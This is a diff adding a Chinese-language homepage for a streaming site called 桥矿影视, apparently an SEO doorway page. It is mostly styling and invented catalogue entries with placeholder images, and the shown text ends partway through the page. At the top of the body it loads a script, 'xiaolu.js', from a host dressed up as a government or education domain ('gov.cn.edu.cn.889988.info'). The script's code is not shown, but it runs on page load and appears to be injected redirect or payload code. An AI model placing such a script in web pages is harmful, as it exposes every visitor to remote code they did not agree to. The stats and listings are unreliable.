@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>桥矿影视 | 桥矿影视网 · 海量影视资源一站直达</title>
+<meta name="keywords" content="桥矿影视,qiaokuangyingshi,桥矿影视网,在线影视,高清影视在线观看,免费看电影,热播电视剧,综艺动漫,影视资源库">
+<meta name="description" content="桥矿影视（qiaokuangyingshi-wap.github.io）是桥矿影视网，海量电影、热播电视剧、综艺、动漫资源一站直达，画质高清、分类齐全、更新及时。">
+<meta name="author" content="桥矿影视">
+<meta name="robots" content="index,follow">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://qiaokuangyingshi-wap.github.io/">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='80'>🎞️</text></svg>">
+<style>
+/* ===== 基础 ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --ink:#101820;--ink2:#8b97a3;--dim:#5f6b76;--bg:#eceff1;--paper:#f6f8f9;
+  --line:#dfe5e9;--line2:#eef2f4;
+  --st:#d4a24e;--st-l:#e8c678;--st-d:#b8862f;/* 钢金 */
+  --iron:#3d4852;--rust:#c0563b;--steel:#5b8def;--coal:#1c2530;
+  --r:6px;--ease:cubic-bezier(.2,.7,.2,1);
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",system-ui,-apple-system,sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.75;overflow-x:hidden;
+  background-image:
+    repeating-linear-gradient(0deg,transparent 0,transparent 39px,rgba(16,24,32,.035) 40px),
+    repeating-linear-gradient(90deg,transparent 0,transparent 39px,rgba(16,24,32,.035) 40px);
+}
+img{display:block;max-width:100%}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+h1,h2,h3,h4{line-height:1.35;font-weight:900;color:var(--ink);letter-spacing:.01em}
+::selection{background:var(--st);color:#101820}
+.shell{max-width:1200px;margin:0 auto;padding:0 22px}
+section{padding:96px 0;position:relative}
+.mono{font-family:"SFMono-Regular",Consolas,"Liberation Mono",monospace}
+
+/* ===== 通用 ===== */
+.kicker{display:inline-flex;align-items:center;gap:9px;font-size:11px;letter-spacing:.22em;text-transform:uppercase;color:var(--st-d);font-weight:800;margin-bottom:14px;font-family:Consolas,monospace}
+.kicker::before{content:"";width:26px;height:2px;background:var(--st)}
+.h2{font-size:clamp(1.6rem,3.6vw,2.4rem)}
+.h2 em{font-style:normal;color:var(--st-d);position:relative;padding:0 4px;z-index:1}
+.h2 em::before{content:"";position:absolute;inset:auto 0 4px 0;height:12px;background:rgba(212,162,78,.25);z-index:-1}
+.sub{color:var(--dim);margin-top:14px;max-width:600px;font-size:15px}
+.head{display:flex;align-items:flex-end;justify-content:space-between;gap:24px;flex-wrap:wrap;margin-bottom:52px}
+.head-l{max-width:680px}
+.center{text-align:center}.center .head-l{margin:0 auto}.center .sub{margin:14px auto 0}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:13px 26px;border-radius:2px;font-weight:800;font-size:14px;cursor:pointer;border:0;transition:.35s var(--ease);font-family:inherit;text-transform:uppercase;letter-spacing:.06em}
+.btn-main{background:var(--st);color:#101820;box-shadow:4px 4px 0 var(--coal)}
+.btn-main:hover{transform:translate(-2px,-2px);box-shadow:7px 7px 0 var(--coal)}
+.btn-out{background:transparent;color:var(--ink);box-shadow:inset 0 0 0 2px var(--line);transition:.3s}
+.btn-out:hover{box-shadow:inset 0 0 0 2px var(--st);color:var(--st-d)}
+.bolt{display:inline-block;transform:translateY(-1px)}
+
+/* ===== 导航 ===== */
+.nav{position:sticky;top:0;z-index:100;background:rgba(16,24,32,.94);backdrop-filter:blur(10px);border-bottom:3px solid var(--st)}
+.nav-in{display:flex;align-items:center;justify-content:space-between;height:74px}
+.logo{display:flex;align-items:center;gap:12px;font-size:23px;font-weight:900;color:#fff}
+.logo .mark{width:38px;height:38px;background:var(--st);color:#101820;display:grid;place-items:center;font-size:16px;font-weight:900;clip-path:polygon(15% 0,100% 0,85% 100%,0 100%)}
+.logo small{font-size:9px;color:var(--st-l);letter-spacing:.24em;text-transform:uppercase;font-weight:800;margin-left:4px;border:1px solid rgba(212,162,78,.4);padding:3px 8px}
+.links{display:flex;gap:2px;align-items:center}
+.links a{padding:9px 16px;font-size:13.5px;font-weight:600;color:#c3ccd4;transition:.25s}
+.links a:hover{color:var(--st-l);background:rgba(212,162,78,.08)}
+.links a.hi{color:#101820;background:var(--st);font-weight:800}
+.m-btn{display:none;width:44px;height:44px;border:1px solid rgba(212,162,78,.4);background:transparent;color:var(--st-l);cursor:pointer;font-size:17px}
+
+/* ===== Hero ===== */
+.hero{padding:0;background:var(--coal);color:#e8edf1;overflow:hidden}
+.hero-in{position:relative;display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:center;min-height:640px}
+.hero::before{content:"";position:absolute;inset:0;background-image:linear-gradient(rgba(212,162,78,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(212,162,78,.05) 1px,transparent 1px);background-size:56px 56px;mask-image:linear-gradient(to bottom,black,transparent)}
+.hero-grid{position:absolute;inset:0;display:grid;grid-template-columns:repeat(12,1fr);gap:0}
+.hero-grid i{display:block;border-right:1px solid rgba(255,255,255,.04)}
+.hero-l,.hero-r{position:relative;z-index:2;padding:80px 0}
+.hero-l{padding-right:20px}
+.h1{font-size:clamp(2.6rem,7vw,5.4rem);line-height:1.06;letter-spacing:-.04em;color:#fff}
+.h1 .bridge{color:var(--st-l)}
+.h1 .mine{position:relative;display:inline-block}
+.h1 .mine::after{content:"";position:absolute;left:0;right:0;bottom:6px;height:14px;background:var(--st);opacity:.35;z-index:-1}
+.hero p.lede{margin-top:26px;font-size:clamp(1rem,1.9vw,1.2rem);color:#a8b6c2;max-width:520px}
+.cta-row{margin-top:34px;display:flex;gap:14px;flex-wrap:wrap}
+.stats{margin-top:46px;display:grid;grid-template-columns:repeat(3,1fr);gap:20px;max-width:520px;border-top:1px solid rgba(255,255,255,.12);padding-top:26px}
+.stat .num{font-size:clamp(1.6rem,3.4vw,2.2rem);font-weight:900;color:var(--st-l);font-family:Consolas,monospace}
+.stat .lbl{font-size:12px;color:#8b97a3;letter-spacing:.1em;text-transform:uppercase;margin-top:2px}
+/* 右侧大卡 */
+.hero-r{display:grid;gap:16px;align-content:center}
+.giant{position:relative;background:var(--ink);border:1px solid rgba(212,162,78,.3);border-radius:2px;overflow:hidden;height:340px}
+.giant img{width:100%;height:100%;object-fit:cover;filter:grayscale(.2) contrast(1.05)}
+.giant .bar{position:absolute;top:0;left:0;right:0;height:34px;background:rgba(16,24,32,.9);display:flex;align-items:center;justify-content:space-between;padding:0 14px;font-family:Consolas,monospace;font-size:11px;color:var(--st-l);letter-spacing:.12em}
+.giant .bar .dot{width:8px;height:8px;background:var(--st);border-radius:50%;box-shadow:0 0 0 4px rgba(212,162,78,.2);animation:pulse 2s infinite}
+@keyframes pulse{50%{opacity:.35}}
+.giant .meta{position:absolute;left:0;right:0;bottom:0;padding:18px;background:linear-gradient(to top,rgba(16,24,32,.96),transparent);color:#fff}
+.giant .meta b{display:block;font-size:18px}
+.giant .meta span{font-size:12px;color:var(--st-l);font-family:Consolas,monospace}
+.mini{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.mini figure{position:relative;height:120px;overflow:hidden;border:1px solid rgba(255,255,255,.08);cursor:pointer}
+.mini figure img{width:100%;height:100%;object-fit:cover;filter:grayscale(.35);transition:.5s var(--ease)}
+.mini figure:hover img{filter:none;transform:scale(1.1)}
+.mini figure figcaption{position:absolute;left:0;right:0;bottom:0;padding:7px 9px;font-size:11px;color:#fff;background:rgba(16,24,32,.9);font-family:Consolas,monospace}
+
+/* ===== 栏目一：影视资源库（管道分线图）===== */
+.pipe{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border-top:3px solid var(--ink);border-bottom:3px solid var(--ink)}
+.node{position:relative;padding:34px 26px 30px;border-right:1px solid var(--line);background:var(--paper);transition:.4s var(--ease)}
+.node:last-child{border-right:0}
+.node::before{content:"";position:absolute;top:-3px;left:26px;width:34px;height:3px;background:var(--st)}
+.node .ic{width:52px;height:52px;background:var(--ink);color:var(--st-l);display:grid;place-items:center;font-size:22px;font-family:Consolas,monospace;margin-bottom:18px;clip-path:polygon(0 0,100% 0,100% 70%,70% 100%,0 100%)}
+.node:nth-child(2) .ic{background:var(--rust)}
+.node:nth-child(3) .ic{background:var(--steel)}
+.node:nth-child(4) .ic{background:var(--st-d)}
+.node h3{font-size:19px;margin-bottom:8px}
+.node p{font-size:13.5px;color:var(--dim);line-height:1.75}
+.node .vol{display:block;margin-top:16px;font-family:Consolas,monospace;font-size:12px;color:var(--st-d);font-weight:800;letter-spacing:.08em}
+.node:hover{background:var(--ink);color:#e8edf1;transform:translateY(-6px);box-shadow:8px 8px 0 var(--st)}
+.node:hover h3{color:#fff}
+.node:hover p,.node:hover .vol{color:var(--st-l)}
+
+/* ===== 栏目二：热播剧集（编号铁板）===== */
+.iron{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.iron-i{position:relative;background:var(--paper);border:1px solid var(--line);overflow:hidden;transition:.4s var(--ease)}
+.iron-i .cv{position:relative;height:240px;overflow:hidden}
+.iron-i .cv img{width:100%;height:100%;object-fit:cover;transition:.6s var(--ease)}
+.iron-i:hover .cv img{transform:scale(1.08)}
+.iron-i .no{position:absolute;top:12px;left:12px;width:40px;height:40px;background:var(--ink);color:var(--st-l);display:grid;place-items:center;font-family:Consolas,monospace;font-size:15px;font-weight:900;z-index:2}
+.iron-i .tag{position:absolute;top:12px;right:12px;background:var(--rust);color:#fff;font-size:11px;font-weight:800;padding:4px 10px;z-index:2;letter-spacing:.06em}
+.iron-i .bd{padding:20px 22px 22px;border-top:3px solid transparent}
+.iron-i h4{font-size:17px;margin-bottom:6px}
+.iron-i .desc{font-size:13px;color:var(--dim);line-height:1.7}
+.iron-i .ft{display:flex;justify-content:space-between;align-items:center;margin-top:16px;padding-top:14px;border-top:1px dashed var(--line);font-size:12px;color:var(--dim);font-family:Consolas,monospace}
+.iron-i:hover{border-color:var(--st);box-shadow:6px 6px 0 var(--ink)}
+.iron-i:hover .bd{border-top-color:var(--st)}
+
+/* ===== 栏目三：综艺频道（轨道滑块）===== */
+.track{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.orb{position:relative;background:var(--ink);border-radius:2px;overflow:hidden;height:300px;cursor:pointer}
+.orb img{width:100%;height:100%;object-fit:cover;opacity:.72;transition:.6s var(--ease)}
+.orb:hover img{opacity:1;transform:scale(1.1)}
+.orb .rail{position:absolute;top:0;left:0;right:0;height:5px;background:rgba(255,255,255,.1);overflow:hidden}
+.orb .rail::after{content:"";position:absolute;left:0;top:0;width:60%;height:100%;background:var(--st);transform:translateX(-100%);animation:rail 3s infinite}
+@keyframes rail{to{transform:translateX(180%)}}
+.orb .cap{position:absolute;left:0;right:0;bottom:0;padding:20px;color:#fff}
+.orb .cap .ep{font-family:Consolas,monospace;font-size:11px;color:var(--st-l);letter-spacing:.1em}
+.orb .cap h4{color:#fff;font-size:16px;margin-top:5px}
+.orb .cap .host{font-size:12px;color:#a8b6c2;margin-top:6px}
+
+/* ===== 栏目四：电影矩阵（编号磁贴）===== */
+.matrix{display:grid;grid-template-columns:repeat(6,1fr);gap:12px}
+.tile{position:relative;background:var(--ink);height:190px;overflow:hidden;cursor:pointer;border:1px solid transparent}
+.tile img{width:100%;height:100%;object-fit:cover;opacity:.55;transition:.5s var(--ease);filter:grayscale(.4)}
+.tile:hover img{opacity:1;filter:none;transform:scale(1.14)}
+.tile .code{position:absolute;top:10px;left:12px;font-family:Consolas,monospace;font-size:11px;color:var(--st-l);letter-spacing:.08em;z-index:2}
+.tile .nm{position:absolute;left:12px;right:12px;bottom:12px;color:#fff;font-size:13.5px;font-weight:800;z-index:2;line-height:1.4}
+.tile .nm small{display:block;font-weight:500;font-size:11px;color:var(--st-l);font-family:Consolas,monospace;margin-top:3px}
+.tile:hover{border-color:var(--st);box-shadow:0 0 0 3px rgba(212,162,78,.2)}
+
+/* ===== 栏目五：更新排期（表格）===== */
+.sched{background:var(--paper);border:1px solid var(--line);overflow:hidden}
+.sched table{width:100%;border-collapse:collapse;font-size:14px}
+.sched th{background:var(--ink);color:var(--st-l);text-align:left;padding:16px 20px;font-size:12px;letter-spacing:.1em;text-transform:uppercase;font-family:Consolas,monospace}
+.sched td{padding:16px 20px;border-bottom:1px solid var(--line2);color:var(--ink)}
+.sched tr:last-child td{border-bottom:0}
+.sched tr:hover td{background:rgba(212,162,78,.06)}
+.sched .dot{display:inline-block;width:9px;height:9px;background:var(--st);margin-right:10px;vertical-align:middle}
+.sched .day{font-family:Consolas,monospace;font-weight:800;color:var(--st-d);white-space:nowrap}
+.sched .nm2{font-weight:800}
+.sched .tp{display:inline-block;font-size:11.5px;padding:3px 10px;background:var(--line2);color:var(--dim);font-weight:700}
+.sched .st2{font-family:Consolas,monospace;font-size:12.5px;font-weight:800;color:var(--rust)}
+
+/* ===== 栏目六：关于桥矿（数据带）===== */
+.facts{display:grid;grid-template-columns:1.1fr 1fr;gap:50px;align-items:center}
+.facts-l h2{margin-bottom:8px}
+.facts-l p{font-size:15px;color:var(--dim);line-height:1.9}
+.facts-l .points{margin-top:28px;display:grid;gap:14px}
+.facts-l .points div{display:grid;grid-template-columns:26px 1fr;gap:12px;align-items:flex-start;font-size:14px;color:var(--ink2);line-height:1.75}
+.facts-l .points b{font-family:Consolas,monospace;color:var(--st-d);font-weight:900;font-size:15px}
+.band{background:var(--ink);color:#e8edf1;padding:40px 36px;border-left:5px solid var(--st)}
+.band .row{display:flex;justify-content:space-between;align-items:flex-end;border-bottom:1px solid rgba(255,255,255,.1);padding:18px 0}
+.band .row:last-child{border-bottom:0}
+.band .row .n{font-size:clamp(1.5rem,3vw,2rem);font-weight:900;color:var(--st-l);font-family:Consolas,monospace}
+.band .row .t{font-size:13px;color:#8b97a3;text-align:right;line-height:1.6}
+
+/* ===== 页脚 ===== */
+footer{background:var(--coal);color:#a8b6c2;padding:64px 0 26px;margin-top:48px;border-top:4px solid var(--st)}
+footer .f-top{display:grid;grid-template-columns:1.8fr 1fr 1fr 1fr;gap:36px;margin-bottom:44px}
+footer .logo{color:#fff}
+footer .f-brand p{font-size:13.5px;color:#7d8a96;line-height:1.95;margin-top:14px}
+footer .fc h4{color:var(--st-l);font-size:14px;margin-bottom:16px;letter-spacing:.08em;text-transform:uppercase;font-family:Consolas,monospace}
+footer .fc a{display:block;font-size:13.5px;color:#7d8a96;padding:5px 0;transition:.2s}
+footer .fc a:hover{color:var(--st-l);transform:translateX(4px)}
+footer .f-bot{border-top:1px solid rgba(255,255,255,.08);padding-top:22px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:12.5px;color:#5f6b76;font-family:Consolas,monospace}
+footer .f-bot a{color:#5f6b76}
+footer .f-bot a:hover{color:#fff}
+
+/* ===== 响应式 ===== */
+@media(max-width:1000px){
+  section{padding:66px 0}
+  .hero-in{grid-template-columns:1fr;gap:40px}
+  .hero-l,.hero-r{padding:56px 0}
+  .hero-r{padding-bottom:56px}
+  .pipe{grid-template-columns:repeat(2,1fr)}
+  .node:nth-child(2){border-right:0}
+  .node:nth-child(1),.node:nth-child(2){border-bottom:1px solid var(--line)}
+  .iron,.track{grid-template-columns:repeat(2,1fr)}
+  .matrix{grid-template-columns:repeat(3,1fr)}
+  .facts{grid-template-columns:1fr;gap:34px}
+  footer .f-top{grid-template-columns:1fr 1fr}
+}
+@media(max-width:640px){
+  .shell{padding:0 16px}
+  .links{position:fixed;top:74px;left:0;right:0;flex-direction:column;background:var(--coal);border-bottom:3px solid var(--st);padding:16px;transform:translateY(-160%);transition:.4s var(--ease)}
+  .links.open{transform:translateY(0)}
+  .links a{padding:12px 16px;width:100%;text-align:center;color:#c3ccd4}
+  .m-btn{display:block}
+  .pipe,.iron,.track,.matrix{grid-template-columns:1fr 1fr}
+  .node{border-right:0;border-bottom:1px solid var(--line)}
+  .node:last-child{border-bottom:0}
+  .stats{grid-template-columns:1fr 1fr;gap:14px}
+  footer .f-top{grid-template-columns:1fr}
+  .sched{font-size:13px;overflow-x:auto}
+  .sched table{min-width:560px}
+  .band{padding:30px 22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- 导航 -->
+<header class="nav">
+  <div class="shell nav-in">
+    <a class="logo" href="#top"><span class="mark">桥矿</span>桥矿影视<small>QIAO KUANG</small></a>
+    <nav class="links" id="links">
+      <a href="#lib">资源库</a>
+      <a href="#drama">热播剧</a>
+      <a href="#show">综艺</a>
+      <a href="#film">电影</a>
+      <a href="#sched">更新排期</a>
+      <a href="#top" class="hi">进入桥矿</a>
+    </nav>
+    <button class="m-btn" id="mBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- 首屏 -->
+<section class="hero" id="top">
+  <div class="hero-grid"><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i></div>
+  <div class="shell hero-in">
+    <div class="hero-l">
+      <span class="kicker">QIAO KUANG VISION · 桥矿影视网</span>
+      <h1 class="h1">桥矿影视<br><span class="bridge">海量影视</span><span class="mine">一站直达</span></h1>
+      <p class="lede">桥矿影视（qiaokuangyingshi-wap.github.io）是桥矿影视网，海量电影、热播电视剧、综艺、动漫资源一站直达，画质高清、分类齐全、更新及时。</p>
+      <div class="cta-row">
+        <a class="btn btn-main" href="#lib"><span class="bolt">⛏</span> 进入影视库</a>
+        <a class="btn btn-out" href="#drama" style="color:#fff;box-shadow:inset 0 0 0 2px rgba(255,255,255,.22)">今日更新 →</a>
+      </div>
+      <div class="stats">
+        <div class="stat"><div class="num">12w+</div><div class="lbl">影视资源</div></div>
+        <div class="stat"><div class="num">4K</div><div class="lbl">高清画质</div></div>
+        <div class="stat"><div class="num">365</div><div class="lbl">全年更新</div></div>
+      </div>
+    </div>
+    <div class="hero-r">
+      <div class="giant">
+        <div class="bar"><span>◉ 桥矿 · 主矿脉 · 正在开采</span><span class="dot"></span></div>
+        <img src="https://picsum.photos/seed/qk1/900/700" alt="桥矿影视主推影片" loading="lazy">
+        <div class="meta"><b>桥矿主推 · 本周焦点</b><span>NO.001 / 悬疑 · 犯罪 · 更新至 24 集</span></div>
+      </div>
+      <div class="mini">
+        <figure><img src="https://picsum.photos/seed/qk2/300/200" alt="热播剧封面" loading="lazy"><figcaption>长夜未央</figcaption></figure>
+        <figure><img src="https://picsum.photos/seed/qk3/300/200" alt="院线新片封面" loading="lazy"><figcaption>长空之王</figcaption></figure>
+        <figure><img src="https://picsum.photos/seed/qk4/300/200" alt="综艺封面" loading="lazy"><figcaption>声入人心</figcaption></figure>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：影视资源库 -->
+<section id="lib" style="padding-top:18px">
+  <div class="shell">
+    <div class="head">
+      <div class="head-l">
+        <span class="kicker">// 01 RESOURCE VAULT</span>
+        <h2 class="h2">桥矿影视 <em>影视资源库</em></h2>
+        <p class="sub">桥矿影视网把海量资源按品类整齐分线，你要的都在这里，分类齐全、随点随看。</p>
+      </div>
+    </div>
+    <div class="pipe">
+      <article class="node"><div class="ic">01</div><h3>电影专区</h3><p>院线大片、经典老片、获奖佳作，高清正片一站收录。</p><span class="vol">VOL.42,000+</span></article>
+      <article class="node"><div class="ic">02</div><h3>热播剧集</h3><p>悬疑、古装、都市、甜宠，热门剧集同步更新。</p><span class="vol">VOL.38,000+</span></article>
+      <article class="node"><div class="ic">03</div><h3>综艺频道</h3><p>竞演、真人秀、美食、益智，下饭快乐不间断。</p><span class="vol">VOL.26,000+</span></article>
+      <article class="node"><div class="ic">04</div><h3>动漫专区</h3><p>国漫日漫韩漫，热血日常奇幻题材全覆盖。</p><span class="vol">VOL.18,000+</span></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：热播剧集 -->
+<section id="drama" style="background:var(--paper)">
+  <div class="shell">
+    <div class="head">
+      <div class="head-l">
+        <span class="kicker">// 02 TRENDING DRAMA</span>
+        <h2 class="h2">桥矿影视 <em>热播剧集</em></h2>
+        <p class="sub">编号建档、分类上架，桥矿影视帮你把热门好剧一张张排好，按编号开看。</p>
+      </div>
+      <a class="btn btn-out" href="#">查看全部 →</a>
+    </div>
+    <div class="iron">
+      <article class="iron-i"><div class="cv"><img src="https://picsum.photos/seed/qd1/600/800" alt="长夜未央剧集封面" loading="lazy"><span class="no">01</span><span class="tag">热播中</span></div><div class="bd"><h4>长夜未央</h4><p class="desc">悬疑犯罪群像剧，一桩旧案牵出整座城市的秘密，反转不断。</p><div class="ft"><span>悬疑 · 犯罪</span><span>更新至 24 集</span></div></div></article>
+      <article class="iron-i"><div class="cv"><img src="https://picsum.photos/seed/qd2/600/800" alt="长安月剧集封面" loading="lazy"><span class="no">02</span><span class="tag">VIP</span></div><div class="bd"><h4>长安月</h4><p class="desc">大唐权谋史诗，少女谋士入局朝堂，每一步都步步惊心。</p><div class="ft"><span>古装 · 权谋</span><span>更新至 12 集</span></div></div></article>
+      <article class="iron-i"><div class="cv"><img src="https://picsum.photos/seed/qd3/600/800" alt="小城夏天剧集封面" loading="lazy"><span class="no">03</span><span class="tag">甜宠</span></div><div class="bd"><h4>小城夏天</h4><p class="desc">治愈系青春甜宠，两个孤独的人在小城相遇，甜到心口。</p><div class="ft"><span>都市 · 甜宠</span><span>更新至 18 集</span></div></div></article>
+      <article class="iron-i"><div class="cv"><img src="https://picsum.photos/seed/qd4/600/800" alt="异人之下剧集封面" loading="lazy"><span class="no">04</span><span class="tag">奇幻</span></div><div class="bd"><h4>异人之下</h4><p class="desc">异能少年觉醒，东方奇幻热血开战，特效场面拉满。</p><div class="ft"><span>奇幻 · 冒险</span><span>更新至 16 集</span></div></div></article>
+      <article class="iron-i"><div class="cv"><img src="https://picsum.photos/seed/qd5/600/800" alt="寻味人间剧集封面" loading="lazy"><span class="no">05</span><span class="tag">治愈</span></div><div class="bd"><h4>寻味人间</h4><p class="desc">美食治愈群像，一饭一蔬里藏着人间烟火与温情。</p><div class="ft"><span>美食 · 治愈</span><span>更新至 10 集</span></div></div></article>
+      <article class="iron-i"><div class="cv"><img src="https://picsum.photos/seed/qd6/600/800" alt="逆光者剧集封面" loading="lazy"><span class="no">06</span><span class="tag">热播中</span></div><div class="bd"><h4>逆光者</h4><p class="desc">刑侦硬汉正剧，卧底与反派的极限博弈，全程高能。</p><div class="ft"><span>刑侦 · 动作</span><span>更新至 20 集</span></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：综艺频道 -->
+<section id="show">
+  <div class="shell">
+    <div class="head center">
+      <div class="head-l">
+        <span class="kicker">// 03 VARIETY TRACK</span>
+        <h2 class="h2">桥矿影视 <em>综艺频道</em></h2>
+        <p class="sub" style="margin:14px auto 0">四条轨道同步运转，音乐、真人秀、美食、喜剧，总有一条对上你的口味。</p>
+      </div>
+    </div>
+    <div class="track">
+      <article class="orb"><img src="https://picsum.photos/seed/qs1/400/600" alt="声入人心综艺" loading="lazy"><div class="rail"></div><div class="cap"><span class="ep">TRACK 01</span><h4>声入人心</h4><div class="host">音乐竞演 · 每周五更新</div></div></article>
+      <article class="orb"><img src="https://picsum.photos/seed/qs2/400/600" alt="周末大逃亡综艺" loading="lazy"><div class="rail"></div><div class="cap"><span class="ep">TRACK 02</span><h4>周末大逃亡</h4><div class="host">慢综艺 · 每周六更新</div></div></article>
+      <article class="orb"><img src="https://picsum.photos/seed/qs3/400/600" alt="寻味中国综艺" loading="lazy"><div class="rail"></div><div class="cap"><span class="ep">TRACK 03</span><h4>寻味中国</h4><div class="host">美食文化 · 每周三更新</div></div></article>
+      <article class="orb"><img src="https://picsum.photos/seed/qs4/400/600" alt="喜剧之王综艺" loading="lazy"><div class="rail"></div><div class="cap"><span class="ep">TRACK 04</span><h4>喜剧之王</h4><div class="host">喜剧竞演 · 每周四更新</div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：电影矩阵 -->
+<section id="film" style="background:var(--paper)">
+  <div class="shell">
+    <div class="head">
+      <div class="head-l">
+        <span class="kicker">// 04 FILM MATRIX</span>
+        <h2 class="h2">桥矿影视 <em>电影矩阵</em></h2>
+        <p class="sub">院线新片、经典老片、类型片分区存放，编号检索，快速定位想看的电影。</p>
+      </div>
+      <a class="btn btn-out" href="#">完整片单 →</a>
+    </div>
+    <div class="matrix">
+      <article class="tile"><img src="https://picsum.photos/seed/qf1/400/600" alt="长空之王电影" loading="lazy"><span class="code">F.01</span><div class="nm">长空之王<small>动作 / 军事 · ★9.2</small></div></article>
+      <article class="tile"><img src="https://picsum.photos/seed/qf2/400/600" alt="迷雾追凶电影" loading="lazy"><span class="code">F.02</span><div class="nm">迷雾追凶<small>悬疑 / 犯罪 · ★8.9</small></div></article>
+      <article class="tile"><img src="https://picsum.photos/seed/qf3/400/600" alt="山海经·烛龙电影" loading="lazy"><span class="code">F.03</span><div class="nm">山海经·烛龙<small>奇幻 / 冒险 · ★9.0</small></div></article>
+      <article class="tile"><img src="https://picsum.photos/seed/qf4/400/600" alt="夏日终曲电影" loading="lazy"><span class="code">F.04</span><div class="nm">夏日终曲<small>爱情 / 治愈 · ★8.7</small></div></article>
+      <article class="tile"><img src="https://picsum.photos/seed/qf5/400/600" alt="机甲战神电影" loading="lazy"><span class="code">F.05</span><div class="nm">机甲战神<small>科幻 / 动作 · ★8.5</small></div></article>
+      <article class="tile"><img src="https://picsum.photos/seed/qf6/400/600" alt="归途列车电影" loading="lazy"><span class="code">F.06</span><div class="nm">归途列车<small>剧情 / 家庭 · ★8.8</small></div></article>
+      <article class="tile"><img src="https://picsum.photos/seed/qf7/400/600" alt="暗夜猎手电影" loading="lazy"><span class="code">F.07</span><div class="nm">暗夜猎手<small>惊悚 / 悬疑 · ★8.4</small></div></article>
+      <article class="tile"><img src="https://picsum.photos/seed/qf8/400/600" alt="云端之上电影" loading="lazy"><span class="code">F.08</span><div class="nm">云端之上<small>动画 / 奇幻 · ★8.9</small></div></article>
+      <article class="tile"><img src="https://picsum.photos/seed/qf9/400/600" alt="边境风云电影" loading="lazy"><span class="code">F.09</span><div class="nm">边境风云<small>警匪 / 动作 · ★8.6</small></div></article>
+      <article class="tile"><img src="https://picsum.photos/seed/qf10/400/600" alt="春日迟迟电影" loading="lazy"><span class="code">F.10</span><div class="nm">春日迟迟<small>文艺 / 爱情 · ★8.3</small></div></article>
+      <article class="tile"><img src="https://picsum.photos/seed/qf11/400/600" alt="深海探秘电影" loading="lazy"><span class="code">F.11</span><div class="nm">深海探秘<small>纪录 / 冒险 · ★9.1</small></div></article>
+      <article class="tile"><img src="https://picsum.photos/seed/qf12/400/600" alt="无名之辈电影" loading="lazy"><span class="code">F.12</span><div class="nm">无名之辈<small>剧情 / 喜剧 · ★8.7</small></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：更新排期 -->
+<section id="sched">
+  <div class="shell">
+    <div class="head center">
+      <div class="head-l">
+        <span class="kicker">// 05 UPDATE SCHEDULE</span>
+        <h2 class="h2">桥矿影视 <em>更新排期表</em></h2>
+        <p class="sub" style="margin:14px auto 0">桥矿影视网每日更新一览，按表跟进，追剧不漏更。</p>
+      </div>
+    </div>
+    <div class="sched">
+      <table>
+        <thead><tr><th>日期</th><th>更新内容</th><th>类型</th><th>进度</th><th>状态</th></tr></thead>
+        <tbody>
+          <tr><td class="day">MON 周一</td><td class="nm2">长夜未央</td><td><span class="tp">悬疑犯罪</span></td><td>更新至 24 集</td><td class="st2"><span class="dot"></span>已更新</td></tr>
+          <tr><td class="day">TUE 周二</td><td class="nm2">逆光者</td><td><span class="tp">刑侦动作</span></td><td>更新至 20 集</td><td class="st2"><span class="dot"></span>已更新</td></tr>
+          <tr><td class="day">WED 周三</td><td class="nm2">寻味中国</td><td><span class="tp">美食综艺</span></td><td>更新至 10 期</td><td class="st2"><span class="dot"></span>已更新</td></tr>
+          <tr><td class="day">THU 周四</td><td class="nm2">喜剧之王</td><td><span class="tp">喜剧竞演</span></td><td>更新至 6 期</td><td class="st2"><span class="dot"></span>已更新</td></tr>
+          <tr><td class="day">FRI 周五</td><td class="nm2">声入人心</td><td><span class="tp">音乐竞演</span></td><td>更新至 12 期</td><td class="st2"><span class="dot"></span>已更新</td></tr>
+          <tr><td class="day">SAT 周六</td><td class="nm2">周末大逃亡</td><td><span class="tp">慢综艺</span></td><td>更新至 8 期</td><td class="st2"><span class="dot"></span>已更新</td></tr>
+          <tr><td class="day">SUN 周日</td><td class="nm2">长安月 / 小城夏天</td><td><span class="tp">古装 · 甜宠</span></td><td>各更新 1 集</td><td class="st2"><span class="dot"></span>已更新</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目六：关于桥矿 -->
+<section id="about" style="background:var(--paper)">
+  <div class="shell">
+    <div class="facts">
+      <div class="facts-l">
+        <span class="kicker">// 06 ABOUT QIAO KUANG</span>
+        <h2 class="h2">关于 <em>桥矿影视</em></h2>
+        <p>桥矿影视（qiaokuangyingshi-wap.github.io）是桥矿影视网，一个把影视资源像矿产一样系统开采、分类上架的在线影视平台。电影、热播剧、综艺、动漫，海量资源一站直达，画质高清、分类齐全、更新及时。</p>
+        <div class="points">
